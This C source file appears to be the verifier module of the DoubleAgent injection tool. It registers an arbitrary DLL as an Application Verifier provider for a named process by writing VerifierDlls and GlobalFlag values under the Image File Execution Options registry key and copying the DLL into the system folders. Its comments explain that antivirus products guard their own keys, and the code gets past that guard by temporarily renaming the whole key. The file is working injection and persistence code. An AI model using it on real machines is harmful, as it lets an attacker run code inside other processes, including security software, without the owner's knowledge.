/* Includes ******************************************************************/
#include <Windows.h>
#include <Shlwapi.h>
#include <crtdbg.h>
#include "Status.h"
#include "OS.h"
#include "Path.h"
#include "Verifier.h"

/* Macros ********************************************************************/
#define VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME L"Image File Execution Options"
#define VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME_TEMP L"3cf9a53d-a1f5-4945-ac5b-5e87bbf46ad2"
#define VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY (L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\" ## VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME)
#define VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY_TEMP (L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\" ## VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME_TEMP)
#define VERIFIER_SYSWOW64_PATH (L"C:\\Windows\\SysWOW64")
#define VERIFIER_SYSNATIVE_PATH (L"C:\\Windows\\Sysnative")
#define VERIFIER_SYSTEM32_PATH (L"C:\\Windows\\System32")
#define VERIFIER_VERIFIERDLLS_VALUE_NAME (L"VerifierDlls")
#define VERIFIER_GLOBALFLAG_VALUE_NAME (L"GlobalFlag")
#define VERIFIER_FLG_APPLICATION_VERIFIER (0x100)

/* Function Declarations *****************************************************/
/*
 * Registers the verifier dll to the process
 */
static DOUBLEAGENT_STATUS verifier_Register(IN PCWSTR pcwszProcessName, IN PCWSTR pcwszVrfDllName);
/*
 * Unregisters the verifier dll from the process
 */
static VOID verifier_Unregister(IN PCWSTR pcwszProcessName);
/*
 * Gets the installation path for the x86 verifier dll
 * The installation path must be freed via HeapFree
 */
static DOUBLEAGENT_STATUS verifier_GetInstallPathX86(IN PCWSTR pcwszVrfDllName, OUT PVOID *ppwszVrfDllInstallPath);
/*
 * Gets the installation path for the x64 verifier dll
 * The installation path must be freed via HeapFree
 */
static DOUBLEAGENT_STATUS verifier_GetInstallPathX64(IN PCWSTR pcwszVrfDllName, OUT PVOID *ppwszVrfDllInstallPath);

/* Public Function Definitions ***********************************************/
DOUBLEAGENT_STATUS VERIFIER_Install(IN PCWSTR pcwszProcessName, IN PCWSTR pcwszVrfDllName, IN PCWSTR pcwszVrfDllPathX86, IN PCWSTR pcwszVrfDllPathX64)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	OS_ARCHITECTURE eOsArchitecture = OS_ARCHITECTURE_INVALID_VALUE;
	PWSTR pwszVrfDllInstallPathX86 = NULL;
	PWSTR pwszVrfDllInstallPathX64 = NULL;
	BOOL bRegistered = FALSE;
	BOOL bCopiedX86 = FALSE;
	BOOL bCopiedX64 = FALSE;

	/* Validates the parameters */
	if ((NULL == pcwszProcessName) || (NULL == pcwszVrfDllName) || (NULL == pcwszVrfDllPathX86) || (NULL == pcwszVrfDllPathX64))
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_INSTALL_INVALID_PARAMS);
		goto lbl_cleanup;
	}

	/* Gets the operating system architecture */
	eStatus = OS_GetArchitecture(&eOsArchitecture);
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		goto lbl_cleanup;
	}

	/* Registers the verifier dll to the process */
	eStatus = verifier_Register(pcwszProcessName, pcwszVrfDllName);
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		goto lbl_cleanup;
	}
	bRegistered = TRUE;

	switch (eOsArchitecture)
	{
	case OS_ARCHITECTURE_X64:
		/* Gets the install path for the x64 verifier dll */
		eStatus = verifier_GetInstallPathX64(pcwszVrfDllName, &pwszVrfDllInstallPathX64);
		if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
		{
			goto lbl_cleanup;
		}

		/* Copies the x64 verifier dll to its installation path */
		if (FALSE == CopyFileW(pcwszVrfDllPathX64, pwszVrfDllInstallPathX64, FALSE))
		{
			DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_INSTALL_COPYFILEW_FAILED_X64);
			goto lbl_cleanup;
		}
		bCopiedX64 = TRUE;
		/* Falls into the x86 case */
	case OS_ARCHITECTURE_X86:
		/* Gets the install path for the x86 verifier dll */
		eStatus = verifier_GetInstallPathX86(pcwszVrfDllName, &pwszVrfDllInstallPathX86);
		if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
		{
			goto lbl_cleanup;
		}

		/* Copies the x86 verifier dll to its installation path */
		if (FALSE == CopyFileW(pcwszVrfDllPathX86, pwszVrfDllInstallPathX86, FALSE))
		{
			DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_INSTALL_COPYFILEW_FAILED_X86);
			goto lbl_cleanup;
		}
		bCopiedX86 = TRUE;
		break;
	default:
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_INSTALL_UNSUPPORTED_SWITCH_CASE);
		goto lbl_cleanup;
	}

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

lbl_cleanup:
	/* If failed, reverts the changes */
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		if (FALSE != bCopiedX86)
		{
			/* Deletes the x86 verifier dll */
			(VOID)DeleteFileW(pwszVrfDllInstallPathX86);
			bCopiedX86 = FALSE;
		}

		if (FALSE != bCopiedX64)
		{
			/* Deletes the x64 verifier dll */
			(VOID)DeleteFileW(pwszVrfDllInstallPathX64);
			bCopiedX64 = FALSE;
		}

		/* Unregisters the verifier dll */
		if (FALSE != bRegistered)
		{
			verifier_Unregister(pcwszProcessName);
			bRegistered = FALSE;
		}
	}

	/* Frees the x86 install path */
	if (NULL != pwszVrfDllInstallPathX86)
	{
		(VOID)HeapFree(GetProcessHeap(), 0, pwszVrfDllInstallPathX86);
		pwszVrfDllInstallPathX86 = NULL;
	}

	/* Frees the x64 install path */
	if (NULL != pwszVrfDllInstallPathX64)
	{
		(VOID)HeapFree(GetProcessHeap(), 0, pwszVrfDllInstallPathX64);
		pwszVrfDllInstallPathX64 = NULL;
	}

	/* Returns status */
	return eStatus;
}

DOUBLEAGENT_STATUS VERIFIER_Repair(VOID)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	HKEY hIfeoKey = NULL;
	LONG lOpenKeyStatus = 0;

	/*
	 * In some cases (application crash, exception, etc.) the install\uninstall functions may accidentally leave the IFEO key with its temporary name
	 * Checks if the temporary name exists
	 */
	lOpenKeyStatus = RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY_TEMP, 0, KEY_WRITE | KEY_WOW64_64KEY, &hIfeoKey);
	if (ERROR_SUCCESS == lOpenKeyStatus)
	{
		/* Repairs the IFEO key by restoring it to its original name */
		if (ERROR_SUCCESS != RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME))
		{
			DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REPAIR_REGRENAMEKEY_FAILED);
			goto lbl_cleanup;
		}
	}
	else if (ERROR_FILE_NOT_FOUND == lOpenKeyStatus)
	{
		/* Everything is OK, nothing to repair */
	}
	else
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REPAIR_REGOPENKEYEXW_FAILED);
		goto lbl_cleanup;
	}

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

lbl_cleanup:
	/* Closes the IFEO key */
	if (NULL != hIfeoKey)
	{
		(VOID)RegCloseKey(hIfeoKey);
		hIfeoKey = NULL;
	}

	/* Returns status */
	return eStatus;
}

VOID VERIFIER_Uninstall(IN PCWSTR pcwszProcessName, IN PCWSTR pcwszVrfDllName)
{
	OS_ARCHITECTURE eOsArchitecture = OS_ARCHITECTURE_INVALID_VALUE;
	PWSTR pwszVrfDllInstallPathX86 = NULL;
	PWSTR pwszVrfDllInstallPathX64 = NULL;

	/* Validates the parameters */
	if ((NULL != pcwszProcessName) && (NULL != pcwszVrfDllName))
	{
		/* Gets the operating system architecture */
		if (FALSE != DOUBLEAGENT_SUCCESS(OS_GetArchitecture(&eOsArchitecture)))
		{
			switch (eOsArchitecture)
			{
			case OS_ARCHITECTURE_X64:
				/* Gets the install path for the x64 verifier dll */
				if (FALSE != DOUBLEAGENT_SUCCESS(verifier_GetInstallPathX64(pcwszVrfDllName, &pwszVrfDllInstallPathX64)))
				{
					/* Deletes the x64 verifier dll */
					(VOID)DeleteFileW(pwszVrfDllInstallPathX64);

					/* Frees the x64 install path */
					(VOID)HeapFree(GetProcessHeap(), 0, pwszVrfDllInstallPathX64);
					pwszVrfDllInstallPathX64 = NULL;
				}
				/* Falls into the x86 case */
			case OS_ARCHITECTURE_X86:
				/* Gets the install path for the x86 verifier dll */
				if (FALSE != DOUBLEAGENT_SUCCESS(verifier_GetInstallPathX86(pcwszVrfDllName, &pwszVrfDllInstallPathX86)))
				{
					/* Deletes the x86 verifier dll */
					(VOID)DeleteFileW(pwszVrfDllInstallPathX86);

					/* Frees the x86 install path */
					(VOID)HeapFree(GetProcessHeap(), 0, pwszVrfDllInstallPathX86);
					pwszVrfDllInstallPathX86 = NULL;
				}
				break;
			}
		}

		/* Unregisters the verifier dll */
		verifier_Unregister(pcwszProcessName);
	}
}

/* Private Function Definitions **********************************************/
static DOUBLEAGENT_STATUS verifier_Register(IN PCWSTR pcwszProcessName, IN PCWSTR pcwszVrfDllName)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	HKEY hIfeoKey = NULL;
	HKEY hIfeoKeyTemp = NULL;
	DWORD dwGlobalFlag = VERIFIER_FLG_APPLICATION_VERIFIER;
	DWORD dwVrfDllNameLenInBytes = 0;
	BOOL bKeyRenamed = FALSE;
	BOOL bCreatedVerifierDlls = FALSE;
	BOOL bCreatedVerifierDllsTemp = FALSE;
	BOOL bCreatedGlobalFlag = FALSE;
	BOOL bCreatedGlobalFlagTemp = FALSE;

	/* Validates the parameters */
	_ASSERT(NULL != pcwszProcessName);
	_ASSERT(NULL != pcwszVrfDllName);

	/* Gets the verifier dll name length in bytes */
	dwVrfDllNameLenInBytes = (DWORD)(wcslen(pcwszVrfDllName) + 1) * sizeof(*pcwszVrfDllName);

	/* Opens the IFEO key */
	if (ERROR_SUCCESS != RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY, 0, KEY_WRITE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hIfeoKey))
	{
		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGOPENKEYEXW_FAILED_IFEO);
		goto lbl_cleanup;
	}

	/* Creates the VerifierDlls value and sets it to the verifier dll name */
	bCreatedVerifierDlls = (ERROR_SUCCESS == RegSetKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME, REG_SZ, pcwszVrfDllName, dwVrfDllNameLenInBytes));

	/*
	 * Creates the GlobalFlag value and sets it to FLG_APPLICATION_VERIFIER
	 * Read more: https://msdn.microsoft.com/en-us/library/windows/hardware/ff542875(v=vs.85).aspx
	 */
	bCreatedGlobalFlag = (ERROR_SUCCESS == RegSetKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME, REG_DWORD, &dwGlobalFlag, sizeof(dwGlobalFlag)));

	/*
	 * The key creation might fail because some antiviruses protect the keys of their processes under the IFEO
	 * One possible bypass is to rename the IFEO key name to a temporary name, create the keys, and restores the IFEO key name
	 */
	if ((FALSE == bCreatedVerifierDlls) || (FALSE == bCreatedGlobalFlag))
	{
		/* Renames the IFEO key name to a temporary name */
		if (ERROR_SUCCESS != RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME_TEMP))
		{
			DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGRENAMEKEY_FAILED);
			goto lbl_cleanup;
		}
		bKeyRenamed = TRUE;

		/*
		 * Opens the temporary IFEO key
		 * The key is reopened because some antiviruses continue monitoring and blocking the handle that opened the original IFEO
		 */
		if (ERROR_SUCCESS != RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY_TEMP, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hIfeoKeyTemp))
		{
			DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGOPENKEYEXW_FAILED_TEMP_IFEO);
			goto lbl_cleanup;
		}

		if (FALSE == bCreatedVerifierDlls)
		{
			/* Tries again to create the VerifierDlls value */
			if (ERROR_SUCCESS != RegSetKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME, REG_SZ, pcwszVrfDllName, dwVrfDllNameLenInBytes))
			{
				DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGSETKEYVALUEW_FAILED_VERIFIERDLLS);
				goto lbl_cleanup;
			}
			bCreatedVerifierDllsTemp = TRUE;
		}

		if (FALSE == bCreatedGlobalFlag)
		{
			/* Tries again to create the GlobalFlag value */
			if (ERROR_SUCCESS != RegSetKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME, REG_DWORD, &dwGlobalFlag, sizeof(dwGlobalFlag)))
			{
				DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGSETKEYVALUEW_FAILED_GLOBALFLAG);
				goto lbl_cleanup;
			}
			bCreatedGlobalFlagTemp = TRUE;
		}
	}

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

lbl_cleanup:
	/* If failed, reverts the changes */
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		/* Deletes the GlobalFlag temp value */
		if (FALSE != bCreatedGlobalFlagTemp)
		{
			(VOID)RegDeleteKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME);
			bCreatedGlobalFlagTemp = FALSE;
		}

		/* Deletes the VerifierDlls temp value */
		if (FALSE != bCreatedVerifierDllsTemp)
		{
			(VOID)RegDeleteKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME);
			bCreatedVerifierDllsTemp = FALSE;
		}

		/* Deletes the GlobalFlag value */
		if (FALSE != bCreatedGlobalFlag)
		{
			(VOID)RegDeleteKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME);
			bCreatedGlobalFlag = FALSE;
		}

		/* Deletes the VerifierDlls value */
		if (FALSE != bCreatedVerifierDlls)
		{
			(VOID)RegDeleteKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME);
			bCreatedVerifierDlls = FALSE;
		}
	}

	/* Closes the temporary IFEO key */
	if (NULL != hIfeoKeyTemp)
	{
		(VOID)RegCloseKey(hIfeoKeyTemp);
		hIfeoKeyTemp = NULL;
	}

	/* Restores the IFEO key name */
	if (FALSE != bKeyRenamed)
	{
		(VOID)RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME);
		bKeyRenamed = FALSE;
	}

	/* Closes the IFEO key */
	if (NULL != hIfeoKey)
	{
		(VOID)RegCloseKey(hIfeoKey);
		hIfeoKey = NULL;
	}

	/* Returns status */
	return eStatus;
}

static VOID verifier_Unregister(IN PCWSTR pcwszProcessName)
{
	HKEY hIfeoKey = NULL;
	HKEY hIfeoKeyTemp = NULL;
	BOOL bDeletedVerifierDlls = FALSE;
	BOOL bDeletedGlobalFlag = FALSE;

	/* Validates the parameters */
	_ASSERT(NULL != pcwszProcessName);

	/* Opens the IFEO key */
	if (ERROR_SUCCESS == RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY, 0, KEY_WRITE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hIfeoKey))
	{
		/* Deletes the VerifierDlls value */
		bDeletedVerifierDlls = (ERROR_SUCCESS == RegDeleteKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME));

		/* Deletes the GlobalFlag value */
		bDeletedGlobalFlag = (ERROR_SUCCESS == RegDeleteKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME));

		/*
		 * The key deletion might fail because some antiviruses protect the keys of their processes under the IFEO
		 * One possible bypass is to rename the IFEO key name to a temporary name, delete the keys, and restores the IFEO key name
		 */
		if ((FALSE == bDeletedVerifierDlls) || (FALSE == bDeletedGlobalFlag))
		{
			/* Renames the IFEO key name to a temporary name */
			if (ERROR_SUCCESS == RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME_TEMP))
			{
				/*
				 * Opens the temporary IFEO key
				 * The key is reopened because some antiviruses continue monitoring and blocking the handle that opened the original IFEO
				 */
				if (ERROR_SUCCESS == RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY_TEMP, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hIfeoKeyTemp))
				{
					/* Tries again to delete the VerifierDlls value */
					if (FALSE == bDeletedVerifierDlls)
					{
						(VOID)RegDeleteKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME);
						bDeletedVerifierDlls = TRUE;
					}

					/* Tries again to delete the GlobalFlag value */
					if (FALSE == bDeletedGlobalFlag)
					{
						(VOID)RegDeleteKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME);
						bDeletedGlobalFlag = TRUE;
					}

					/* Closes the temporary IFEO key */
					(VOID)RegCloseKey(hIfeoKeyTemp);
					hIfeoKeyTemp = NULL;
				}

				/* Restores the IFEO key name */
				(VOID)RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME);
			}
		}

		/* Closes the IFEO key */
		(VOID)RegCloseKey(hIfeoKey);
		hIfeoKey = NULL;
	}
}

static DOUBLEAGENT_STATUS verifier_GetInstallPathX86(IN PCWSTR pcwszVrfDllName, OUT PVOID *ppwszVrfDllInstallPath)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	PWSTR pwszVrfDllInstallPathLocal = NULL;

	/* Validates the parameters */
	_ASSERT(NULL != pcwszVrfDllName);
	_ASSERT(NULL != ppwszVrfDllInstallPath);

#ifndef _WIN64
	/*
	 * x86 OS - Path should be System32
	 * x64 OS - Path should be SysWOW64 (File system redirection would implicitly convert System32 to SysWOW64)
	 */
	eStatus = PATH_Combine(VERIFIER_SYSTEM32_PATH, pcwszVrfDllName, &pwszVrfDllInstallPathLocal);
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		goto lbl_cleanup;
	}
#else
	/*
	 * x86 OS - Impossible (Can't run x64 code on x86 OS)
	 * x64 OS - Path should be SysWOW64
	 */
	eStatus = PATH_Combine(VERIFIER_SYSWOW64_PATH, pcwszVrfDllName, &pwszVrfDllInstallPathLocal);
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		goto lbl_cleanup;
	}
#endif

	/* Sets the received parameters */
	*ppwszVrfDllInstallPath = pwszVrfDllInstallPathLocal;
	pwszVrfDllInstallPathLocal = NULL;

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

lbl_cleanup:
	/* Frees the install path */
	if (NULL != pwszVrfDllInstallPathLocal)
	{
		(VOID)HeapFree(GetProcessHeap(), 0, pwszVrfDllInstallPathLocal);
		pwszVrfDllInstallPathLocal = NULL;
	}

	/* Returns status */
	return eStatus;
}

static DOUBLEAGENT_STATUS verifier_GetInstallPathX64(IN PCWSTR pcwszVrfDllName, OUT PVOID *ppwszVrfDllInstallPath)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	PWSTR pwszVrfDllInstallPathLocal = NULL;

	/* Validates the parameters */
	_ASSERT(NULL != pcwszVrfDllName);
	_ASSERT(NULL != ppwszVrfDllInstallPath);

#ifndef _WIN64
	/* x64 OS - Path should be System32 (File system redirection would implicitly convert Sysnative to System32) */
	eStatus = PATH_Combine(VERIFIER_SYSNATIVE_PATH, pcwszVrfDllName, &pwszVrfDllInstallPathLocal);
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		goto lbl_cleanup;
	}
#else
	/* x64 OS - Path should be System32 */
	eStatus = PATH_Combine(VERIFIER_SYSTEM32_PATH, pcwszVrfDllName, &pwszVrfDllInstallPathLocal);
	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	{
		goto lbl_cleanup;
	}
#endif

	/* Sets the received parameters */
	*ppwszVrfDllInstallPath = pwszVrfDllInstallPathLocal;
	pwszVrfDllInstallPathLocal = NULL;

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

lbl_cleanup:
	/* Frees the install path */
	if (NULL != pwszVrfDllInstallPathLocal)
	{
		(VOID)HeapFree(GetProcessHeap(), 0, pwszVrfDllInstallPathLocal);
		pwszVrfDllInstallPathLocal = NULL;
	}

	/* Returns status */
	return eStatus;
}
